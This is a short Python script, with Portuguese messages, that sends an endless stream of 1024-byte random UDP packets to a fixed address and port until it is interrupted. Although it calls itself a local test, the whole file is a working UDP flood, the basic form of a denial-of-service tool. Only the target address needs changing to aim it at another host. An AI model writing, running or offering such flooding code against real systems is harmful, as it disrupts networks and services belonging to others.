import socket
import random

ip_alvo = "192.168.1.1" #loc
porta = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(f"Enviando pacotes UDP para {ip_alvo}:{porta} (teste local)")

try:
    while True:
        pacote = random._urandom(1024)
        sock.sendto(pacote, (ip_alvo, porta))
        print(f"Pacote enviado para {ip_alvo}:{porta}")
except KeyboardInterrupt:
    print("\nEncerrado pelo usuário.")
